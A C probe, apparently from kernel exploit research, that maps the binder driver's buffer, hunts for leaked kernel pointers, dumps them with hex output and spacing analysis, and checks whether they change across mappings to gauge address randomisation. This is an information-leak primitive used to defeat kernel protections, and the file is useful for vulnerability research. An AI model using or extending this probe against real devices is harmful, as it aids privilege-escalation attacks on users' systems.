/*
 * binder_leak_deep.c — Deep analysis of binder mmap kernel pointer leak
 *
 * The binder driver mmaps a transaction buffer into userspace. This probe
 * examines the full mmap'd region for kernel pointers and attempts to
 * understand the data structures exposed.
 */
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define BINDER_VERSION  _IOWR('b', 9, struct binder_version)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)

struct binder_version {
    signed long protocol_version;
};

/* Check if value looks like kernel pointer */
static int is_kptr(uint64_t val) {
    return (val >= 0xffffffc000000000ULL && val <= 0xffffffffffffffffULL);
}

int main(void) {
    printf("=== BINDER MMAP KERNEL POINTER LEAK — DEEP ANALYSIS ===\n");
    printf("uid=%u\n\n", getuid());

    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { printf("OPEN FAILED\n"); return 1; }

    /* Try different mmap sizes */
    size_t sizes[] = { 4096, 8192, 16384, 65536, 131072, 1048576 };
    int nsizes = sizeof(sizes) / sizeof(sizes[0]);
    int si;

    for (si = 0; si < nsizes; si++) {
        size_t sz = sizes[si];
        void *map = mmap(NULL, sz, PROT_READ, MAP_PRIVATE, fd, 0);
        if (map == MAP_FAILED) {
            printf("MMAP size=%zu: FAILED errno=%d\n", sz, errno);
            continue;
        }
        printf("MMAP size=%zu at %p:\n", sz, map);

        /* Scan for kernel pointers */
        uint64_t *vals = (uint64_t *)map;
        int nvals = sz / 8;
        int kptrs = 0;
        uint64_t first_kptr = 0;
        uint64_t last_kptr = 0;
        int first_off = -1;
        int last_off = -1;

        int i;
        for (i = 0; i < nvals; i++) {
            if (is_kptr(vals[i])) {
                kptrs++;
                if (first_kptr == 0) {
                    first_kptr = vals[i];
                    first_off = i * 8;
                }
                last_kptr = vals[i];
                last_off = i * 8;
            }
        }

        printf("  kernel pointers found: %d\n", kptrs);
        if (kptrs > 0) {
            printf("  first: offset=%d val=0x%016llx\n", first_off, (unsigned long long)first_kptr);
            printf("  last:  offset=%d val=0x%016llx\n", last_off, (unsigned long long)last_kptr);

            /* Dump first 256 bytes in detail */
            printf("  First 256 bytes hex dump:\n");
            uint8_t *bytes = (uint8_t *)map;
            int row;
            for (row = 0; row < 256; row += 16) {
                printf("    %04x: ", row);
                int col;
                for (col = 0; col < 16; col++) {
                    printf("%02x ", bytes[row + col]);
                }
                printf(" | ");
                for (col = 0; col < 16; col++) {
                    uint8_t c = bytes[row + col];
                    printf("%c", (c >= 32 && c < 127) ? c : '.');
                }
                printf("\n");
            }

            /* Dump all unique kernel pointers */
            printf("  Unique kernel pointers:\n");
            uint64_t seen[1024];
            int nseen = 0;
            for (i = 0; i < nvals && nseen < 1024; i++) {
                if (is_kptr(vals[i])) {
                    int j, dup = 0;
                    for (j = 0; j < nseen; j++) {
                        if (seen[j] == vals[i]) { dup = 1; break; }
                    }
                    if (!dup) {
                        seen[nseen++] = vals[i];
                        printf("    [%d] offset=%d: 0x%016llx\n",
                               nseen, i * 8, (unsigned long long)vals[i]);
                    }
                }
            }

            /* Check pointer alignment and spacing */
            if (nseen >= 2) {
                printf("  Pointer spacing analysis:\n");
                int j;
                for (j = 1; j < nseen && j < 10; j++) {
                    int64_t diff = (int64_t)(seen[j] - seen[0]);
                    printf("    [%d]-[0] = %+lld (0x%llx)\n",
                           j, (long long)diff, (unsigned long long)(seen[j] - seen[0]));
                }
            }
        }

        /* Also look for physical-range addresses */
        int phys = 0;
        for (i = 0; i < nvals; i++) {
            /* Physical addresses: typically below 0x200000000 on 32-bit phys, or in 0xf* range */
            if (vals[i] > 0x1000 && vals[i] < 0x200000000ULL && vals[i] != 0) {
                phys++;
            }
        }
        printf("  non-zero non-kernel values (possible phys addr): %d\n", phys);

        munmap(map, sz);
        printf("\n");
    }

    /* Test: do multiple mmaps leak different pointers? (ASLR check) */
    printf("=== ASLR CHECK: Multiple mmap iterations ===\n");
    {
        int iter;
        for (iter = 0; iter < 5; iter++) {
            close(fd);
            fd = open("/dev/binder", O_RDWR);
            if (fd < 0) break;
            void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
            if (map == MAP_FAILED) continue;
            uint64_t *vals = (uint64_t *)map;
            if (is_kptr(vals[0])) {
                printf("  iter %d: kptr[0]=0x%016llx\n", iter, (unsigned long long)vals[0]);
            } else {
                printf("  iter %d: kptr[0]=0x%016llx (not kernel)\n", iter, (unsigned long long)vals[0]);
            }
            munmap(map, 4096);
        }
    }

    close(fd);
    printf("\n=== ANALYSIS COMPLETE ===\n");
    return 0;
}
